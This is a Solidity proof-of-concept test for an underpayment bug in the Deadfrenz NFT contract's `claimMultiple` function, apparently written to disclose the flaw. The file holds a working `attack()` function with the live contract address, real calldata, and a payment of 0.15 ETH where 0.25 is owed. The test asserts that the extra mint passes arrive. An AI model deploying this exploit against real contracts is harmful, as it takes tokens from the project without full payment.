// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.6;

import "ds-test/test.sol";

interface Deadfrenz {
    function balanceOf(address owner, uint256 id) external view returns (uint256);
}

/**
This explout is based on the following transaction:
https://etherscan.io/tx/0x55378c0e4217cef7d7c08deaa87a75e5c122bb08684b3dd8b17508fcf2b3b6d6
This user is supposed to pay 0.25 ETH for their claim, and likely the
frontend has set the value of the tx accordingly.  But the user could has set
the value 0.15 ETH and it would still have succeeded.  This was just the
first tx I found that called `claimMultiple` with more than one paid mint
pass type. There are likely more severe cases. I do not know if anyone
actually exploited the bug.
*/
contract DeadfrenzattackTest is DSTest {
    address constant sender = 0x5bB1d72c002d76Da7327E51F21005215FB858d92;
    address constant deadfrenz = 0x090f688f0C11a8671C47d833AF3Cf965c30d3C35;

    bytes calld = hex"632c6f1f00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000340000000000000000000000000000000000000000000000000000000000000000d857cb92f43b4349fc10b6814ccbc09c4b188bd71e1cb9eb5a4bd877d4fa97a62c6058a9dc0f1e3af804de90daac08cfb05568e040bee40ea243abacec071decdd9fe0cbef1e5f8950844a0912e91ded573ae91933e27b25065e5a9ec7abc701e36024f14d19a9f045666e9933e165caddce13a4a46ab7eaee4045826478c078d322c3357f15496ba8a2259f231bcc49da9bf3d0cd92c32181c907ee81f4715fb5e5a39b8ced2015d89bf2623fc6117a1bbe457a17eff25707785045f59cfc77c5c2901f2cd2927f5410358ab51009c2098159a7b94e248e249e8a07d4037006b4d251677d85fd26424332ccdf0e088c6292e2b2b0b53a32e59f790d7b57f0f96af155cfa354b9f271a6eccf8972919a649897a60948e0c804ac6c404c9a4950ff98ecda23315ee17b4cdb610542ce2b5ef33d9d8b1b63591bbab8ff4b7fd7505641bdc524b3f2684a8fe8e1b6c6524b0955e92faeb6cc691032ac60dc8837bed80675db189384580cfa41e8db885b486470734e4e52f01842961e8c9174b75e70ae9f44dbdf9e3dbb4e7423a887496f300b51a6ee098c51ae1487e00463908fe0000000000000000000000000000000000000000000000000000000000000008fe21a0c9c14221009779dc97214f216cf274f8c7a32a03b332c8b50cd1b9673c927e933091ee167df72788ccc0859c71993968bccb9986206cbc810148f77e5d575a3b7dd7b1c3be04e1f516a30150cd7e2e17bb67a25583bd6dcdfed03de86cbdcc3986666cdc3a7ab50319c134f48431a04e0133a9bc6a2184daf068c77589bb0aeb7dc4729656fbcab762091022919cf98bb81cff2bd92f9613467bddc7258fdddc11f170d16b27538ff26fc3e7da0d31777957252e9723a573fb33f4912b098442d008fd9c8739c073d2ca1a1449be2e6c74386ad85000d281f6e025041a60c1e6a0d6f8458b2ac06440007c456df20fee992aa44cc68e39687aa44dab89000000000000000000000000000000000000000000000000000000000000000b9a1a18286a02c731753ae5aa5bfe9b263377ad23155ec39e7b61b8dfdda56aa22b1beb09a739034437dbaca8d138ecf99355ad942304e7ee9d04c709f93568e34b34371c334b59f476fbf73e7c6c3c0d42769b10dd7b99c33cc8194d9640a489d38e896ee04c3a34e0293ce31917ff09fd2a4f0dbb1893f18b28f8cb3458e346b7a0c9968e6728caf5da672ef3cb5f66153b378cdf69938e411961a3bd447d6a823cee526f5277c39b5971e0ea3d67c4f591921c6554685a724b1d6c4fe2cb74ea7f3e308cc5016a28e3b724869a469585305730ccf667e2197437b3489341e0375a9e78a777f22d408cc1e43aa46c0c9f6d2cfca00c5f8cd426c8493b1e719650aa8f9a8db8c6192310c4985d4b8defadb305c245666f9cf34e4e19acbb2323e12f8e0ca1a6b1fdfadb70042dcf4f94fe0b7a3d42169976f85d1fdf16bfd02617b9fdb75d2fee8ff7b89379578ff89a1e31ad815786ade7bafa78248c73d042";

    // This allows our countract to receive the ERC1155 tokens (mint passes).
    function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) {
        return 0xbc197c81;
    }

    function attack() public {
        // The required payment amount is 1*0.15 ether + 1*0.1 ether = 0.25 ether.
        // Due to a a bug in `claimMultiple`, where `msg.value` is used to check
        // each token claim individually, a user can get away with paying only
        // the amount needed for their most expensive
        // `numPasses*mintPasses[mpIndex].mintPrice`. In this case, 1*0.15 is
        // the most expensive, so that's what we pay.
        (bool success, bytes memory data) = deadfrenz.call{value: 0.15 ether}(calld);
        require(success, "call failed");
    }

    function test_attack() public {
        assertEq(address(this), sender, "You need to set the DAPP_TEST_FROM variable in .dapprc to 0x5bB1d72c002d76Da7327E51F21005215FB858d92 to run this test");

        assertEq(Deadfrenz(deadfrenz).balanceOf(address(this), 2), 0);
        assertEq(Deadfrenz(deadfrenz).balanceOf(address(this), 4), 0);
        assertEq(Deadfrenz(deadfrenz).balanceOf(address(this), 5), 0);
        attack();
        assertEq(Deadfrenz(deadfrenz).balanceOf(address(this), 2), 4);
        assertEq(Deadfrenz(deadfrenz).balanceOf(address(this), 4), 1);
        assertEq(Deadfrenz(deadfrenz).balanceOf(address(this), 5), 1);
    }
}
